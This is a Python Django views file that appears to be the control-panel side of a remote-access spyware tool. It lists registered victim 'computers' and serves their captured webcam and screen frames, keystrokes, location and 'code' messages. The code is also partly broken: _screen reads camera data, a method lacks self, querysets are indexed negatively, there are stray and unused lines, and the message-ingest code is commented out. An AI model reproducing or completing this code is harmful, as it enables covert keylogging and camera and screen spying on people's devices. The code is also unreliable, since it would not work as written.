import random
import threading
import pafy
import youtube_dl
from django.core.files.storage import FileSystemStorage
from django.http import JsonResponse, StreamingHttpResponse, HttpResponse
from django.shortcuts import render
import cv2
from django.views.decorators.gzip import gzip_page
from pip._internal.operations.check import create_package_set_from_installed
from rest_framework.views import APIView

from .models import Computers, Messages

it = 0

APIView
class SERVE:
    # camera
    # screen
    # location
    # keyboard
    # code
    def __init__(self):
        self.res = "online"
        self.data = ""
        self.user = ""

    def set_user(self, user):
        if type(user) == int:
            self.user = Computers.objects.all()[user]
        else:
            self.user = user
        return HttpResponse(self.user)

    def create_user(details):
        c = Computers(name=details, os=details.split("|")[0])
        c.save()

    def get_user(self, request):
        return render(request, "sys.html", {"type": "users", "cont": Computers.objects.all()})

    def _camera(self):
        m = Messages.objects.filter(computer=self.user, type="cam")
        if m:
            m = m[-1]

            yield (b'--frame\r\n'
                   b"Content-Type:image/jpeg\r\n\r\n" + m + b"\r\n\r\n")
        else:
            yield "NO RECENT PICTURES"

    def _screen(self):
        m = Messages.objects.filter(computer=self.user, type="cam")

        if m:
            m = m[-1]

            yield (b'--frame\r\n'
                   b"Content-Type:image/jpeg\r\n\r\n" + m + b"\r\n\r\n")
        else:
            yield "NO RECENT PICTURES"

    def _keyboard(self):
        m = Messages.objects.filter(computer=self.user, type="key")
        return m

    def _code(self):
        m = Messages.objects.filter(computer=self.user, type="code")
        return m

    def _location(self):
        m = Messages.objects.filter(computer=self.user, type="loc")
        return m

    @gzip_page
    def camera(self, request):
        try:
            print(request.method)
            s = StreamingHttpResponse(self._camera(), content_type="multipart/x-mixed-replace;boundary=frame")
            return s
        except Exception as e:
            print(e)

    @gzip_page
    def screen(self, request):
        try:
            print(request.method)
            s = StreamingHttpResponse(self._screen(), content_type="multipart/x-mixed-replace;boundary=frame")
            return s
        except Exception as e:
            print(e)

    def location(self, request):
        return render(request, "sys.html", {"type": "location", "cont": self._location()})

    def keyboard(self, request):
        return render(request, "sys.html", {"type": "keyboard", "cont": self._keyboard()})

    def output(self, request):
        self.data = "|".join(request["code"].split(" "))

        return HttpResponse(self.data)

    def messages(self, request):
        print(request.GET.keys())

        return HttpResponse("online")


# inner loop
# ping
#
r"""        from_ = request.GET["from_"]
        cont = request.GET["content"]
        computer = Computers.objects.filter(name=from_)
        c = Messages(_from=from_, cont=cont, type=type, computer=computer)
        c.save()"""
